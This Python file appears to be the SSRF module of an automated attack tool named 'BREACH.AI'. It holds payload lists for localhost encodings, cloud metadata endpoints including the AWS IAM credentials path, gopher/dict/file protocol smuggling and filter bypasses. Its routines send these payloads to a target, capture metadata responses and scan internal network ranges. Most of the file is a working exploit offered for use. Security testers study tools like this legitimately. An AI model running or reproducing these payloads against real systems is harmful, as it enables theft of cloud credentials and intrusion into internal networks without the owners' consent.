"""
BREACH.AI - Server-Side Request Forgery (SSRF) Attack Module

Tests for SSRF vulnerabilities that allow attackers to make
requests from the server to internal or external resources.
"""

import asyncio
import re
from typing import Optional
from urllib.parse import quote, urlparse

from backend.breach.attacks.base import AttackResult, BaseAttack
from backend.breach.core.memory import AccessLevel, Severity
from backend.breach.utils.http import HTTPClient, HTTPResponse
from backend.breach.utils.logger import logger


class SSRFAttack(BaseAttack):
    """
    Server-Side Request Forgery (SSRF) attack module.

    Tests for SSRF by attempting to make the server request
    internal resources or external URLs.
    """

    name = "Server-Side Request Forgery"
    attack_type = "ssrf"
    description = "Tests for SSRF vulnerabilities"
    severity = Severity.HIGH
    owasp_category = "A10:2021 Server-Side Request Forgery"
    cwe_id = 918

    # Internal IP addresses to test
    INTERNAL_IPS = [
        "127.0.0.1",
        "localhost",
        "0.0.0.0",
        "0",
        "[::1]",
        "[::]",
        "127.1",
        "127.0.1",
        "2130706433",  # Decimal for 127.0.0.1
        "0x7f000001",  # Hex for 127.0.0.1
        "017700000001",  # Octal for 127.0.0.1
    ]

    # Internal services to probe
    INTERNAL_PORTS = [
        (80, "http"),
        (443, "https"),
        (22, "ssh"),
        (3306, "mysql"),
        (5432, "postgresql"),
        (6379, "redis"),
        (27017, "mongodb"),
        (9200, "elasticsearch"),
        (8080, "http-alt"),
        (8443, "https-alt"),
        (5000, "flask"),
        (3000, "node"),
    ]

    # Cloud metadata endpoints
    CLOUD_METADATA = {
        "aws": [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/user-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        ],
        "gcp": [
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/computeMetadata/v1/",
        ],
        "azure": [
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        ],
        "digitalocean": [
            "http://169.254.169.254/metadata/v1/",
        ],
    }

    # URL bypass techniques
    BYPASS_PAYLOADS = [
        # Different representations of localhost
        "http://127.0.0.1",
        "http://localhost",
        "http://[::1]",
        "http://127.1",
        "http://0.0.0.0",
        "http://0",

        # URL encoding
        "http://127.0.0.1%00.evil.com",
        "http://127.0.0.1%23.evil.com",

        # Decimal/Hex/Octal
        "http://2130706433",  # 127.0.0.1 in decimal
        "http://0x7f.0x0.0x0.0x1",

        # DNS rebinding style
        "http://127.0.0.1.nip.io",
        "http://localtest.me",
        "http://spoofed.burpcollaborator.net",

        # Protocol smuggling
        "gopher://127.0.0.1:6379/_",
        "file:///etc/passwd",
        "dict://127.0.0.1:6379/INFO",
    ]

    def get_payloads(self) -> list[str]:
        """Get SSRF payloads."""
        payloads = []

        # Internal IP payloads
        for ip in self.INTERNAL_IPS[:5]:
            payloads.append(f"http://{ip}/")
            payloads.append(f"http://{ip}:80/")

        # Cloud metadata
        for cloud, urls in self.CLOUD_METADATA.items():
            payloads.extend(urls[:1])

        # Bypass techniques
        payloads.extend(self.BYPASS_PAYLOADS[:5])

        return payloads

    async def check(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> bool:
        """Quick check for SSRF vulnerability."""
        if not parameter:
            return False

        # Get baseline response
        baseline = await self._send_payload(url, parameter, "https://example.com", method)

        # Try internal URL
        for payload in ["http://127.0.0.1/", "http://localhost/"]:
            response = await self._send_payload(url, parameter, payload, method)

            # Check for indicators of successful SSRF
            if self._detect_ssrf_indicators(response, baseline):
                return True

        return False

    async def exploit(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> AttackResult:
        """Full SSRF exploitation attempt."""
        if not parameter:
            return self._create_result(False, url, parameter)

        result = self._create_result(False, url, parameter)

        # Get baseline
        baseline = await self._send_payload(url, parameter, "https://httpbin.org/get", method)

        # Step 1: Test basic internal access
        internal_result = await self._test_internal_access(url, parameter, method, baseline)
        if internal_result:
            result.success = True
            result.payload = internal_result["payload"]
            result.details = f"SSRF to internal host: {internal_result['target']}"
            result.response = internal_result.get("response", "")
            result.add_evidence(
                "ssrf_internal",
                f"Accessed internal resource: {internal_result['target']}",
                internal_result.get("response", "")[:500]
            )

        # Step 2: Test cloud metadata access (critical!)
        cloud_result = await self._test_cloud_metadata(url, parameter, method)
        if cloud_result:
            result.success = True
            result.payload = cloud_result["payload"]
            result.details = f"SSRF to {cloud_result['cloud']} metadata service!"
            result.data_sample = cloud_result.get("data", "")
            result.access_gained = AccessLevel.CLOUD
            result.severity = Severity.CRITICAL
            result.add_evidence(
                "cloud_metadata",
                f"Accessed {cloud_result['cloud']} cloud metadata",
                cloud_result.get("data", "")[:1000]
            )

        # Step 3: Scan internal network
        if result.success:
            internal_scan = await self._scan_internal_network(url, parameter, method)
            if internal_scan:
                result.context["internal_services"] = internal_scan
                result.add_evidence(
                    "internal_scan",
                    "Discovered internal services",
                    str(internal_scan)
                )

        # Step 4: Try bypass techniques if basic failed
        if not result.success:
            bypass_result = await self._try_bypasses(url, parameter, method, baseline)
            if bypass_result:
                result.success = True
                result.payload = bypass_result["payload"]
                result.details = f"SSRF with bypass: {bypass_result['technique']}"

        return result

    def _detect_ssrf_indicators(
        self,
        response: HTTPResponse,
        baseline: HTTPResponse
    ) -> bool:
        """Detect indicators of successful SSRF."""
        # Check for different response indicating server-side request
        if response.status_code != baseline.status_code:
            return True

        # Check for internal service indicators in response
        internal_indicators = [
            "localhost",
            "127.0.0.1",
            "internal server",
            "connection refused",
            "connection timed out",
            "no route to host",
            "network unreachable",
            "apache",
            "nginx",
            "tomcat",
        ]

        body_lower = response.body.lower()
        for indicator in internal_indicators:
            if indicator in body_lower and indicator not in baseline.body.lower():
                return True

        # Significant response size difference
        if abs(len(response.body) - len(baseline.body)) > 500:
            return True

        return False

    async def _test_internal_access(
        self,
        url: str,
        parameter: str,
        method: str,
        baseline: HTTPResponse
    ) -> Optional[dict]:
        """Test access to internal resources."""
        for ip in self.INTERNAL_IPS:
            for port, service in self.INTERNAL_PORTS[:5]:
                payload = f"http://{ip}:{port}/"

                try:
                    response = await self._send_payload(url, parameter, payload, method)

                    # Check if we got something interesting
                    if self._is_internal_response(response, baseline):
                        return {
                            "payload": payload,
                            "target": f"{ip}:{port}",
                            "service": service,
                            "response": response.body[:1000],
                        }
                except Exception:
                    continue

        return None

    def _is_internal_response(
        self,
        response: HTTPResponse,
        baseline: HTTPResponse
    ) -> bool:
        """Check if response indicates successful internal access."""
        # Success indicators
        if response.is_success and response.status_code != baseline.status_code:
            return True

        # Check for service-specific content
        service_indicators = {
            "redis": ["redis", "-err", "redis_version"],
            "mongodb": ["mongodb", "ismaster"],
            "elasticsearch": ["elasticsearch", "cluster_name"],
            "mysql": ["mysql", "mariadb"],
        }

        body_lower = response.body.lower()
        for service, indicators in service_indicators.items():
            if any(ind in body_lower for ind in indicators):
                return True

        # HTML response from internal server
        if "<html" in body_lower and "<html" not in baseline.body.lower():
            return True

        return False

    async def _test_cloud_metadata(
        self,
        url: str,
        parameter: str,
        method: str
    ) -> Optional[dict]:
        """Test access to cloud metadata services."""
        for cloud, endpoints in self.CLOUD_METADATA.items():
            for endpoint in endpoints:
                # AWS requires special header
                headers = {}
                if cloud == "gcp":
                    headers = {"Metadata-Flavor": "Google"}
                elif cloud == "azure":
                    headers = {"Metadata": "true"}

                try:
                    response = await self._send_payload(
                        url, parameter, endpoint, method
                    )

                    # Check for cloud metadata indicators
                    if self._is_cloud_metadata_response(response, cloud):
                        return {
                            "cloud": cloud,
                            "payload": endpoint,
                            "data": response.body[:2000],
                        }
                except Exception:
                    continue

        return None

    def _is_cloud_metadata_response(
        self,
        response: HTTPResponse,
        cloud: str
    ) -> bool:
        """Check if response contains cloud metadata."""
        if not response.is_success:
            return False

        body = response.body.lower()

        indicators = {
            "aws": ["ami-id", "instance-id", "local-hostname", "public-keys", "iam"],
            "gcp": ["project-id", "instance", "zone", "machine-type"],
            "azure": ["subscriptionid", "resourcegroupname", "vmid"],
            "digitalocean": ["droplet_id", "hostname", "region"],
        }

        cloud_indicators = indicators.get(cloud, [])
        return any(ind in body for ind in cloud_indicators)

    async def _scan_internal_network(
        self,
        url: str,
        parameter: str,
        method: str
    ) -> list[dict]:
        """Scan internal network for services."""
        found_services = []

        # Common internal IP ranges to check
        internal_ranges = [
            "192.168.1.1",
            "192.168.0.1",
            "10.0.0.1",
            "172.16.0.1",
        ]

        for ip in internal_ranges:
            for port, service in self.INTERNAL_PORTS[:3]:  # Limit to avoid timeout
                payload = f"http://{ip}:{port}/"

                try:
                    response = await self._send_payload(url, parameter, payload, method)

                    if response.is_success:
                        found_services.append({
                            "ip": ip,
                            "port": port,
                            "service": service,
                        })
                except Exception:
                    continue

        return found_services

    async def _try_bypasses(
        self,
        url: str,
        parameter: str,
        method: str,
        baseline: HTTPResponse
    ) -> Optional[dict]:
        """Try various SSRF bypass techniques."""
        bypass_techniques = [
            ("url_encoding", "http://127.0.0.1%2523@evil.com/"),
            ("double_encoding", "http://127.0.0.1%252523@evil.com/"),
            ("decimal_ip", "http://2130706433/"),
            ("hex_ip", "http://0x7f000001/"),
            ("octal_ip", "http://0177.0.0.1/"),
            ("ipv6", "http://[::ffff:127.0.0.1]/"),
            ("dns_rebind", "http://127.0.0.1.nip.io/"),
            ("open_redirect", url + "?redirect=http://127.0.0.1/"),
        ]

        for technique, payload in bypass_techniques:
            try:
                response = await self._send_payload(url, parameter, payload, method)

                if self._detect_ssrf_indicators(response, baseline):
                    return {
                        "technique": technique,
                        "payload": payload,
                    }
            except Exception:
                continue

        return None
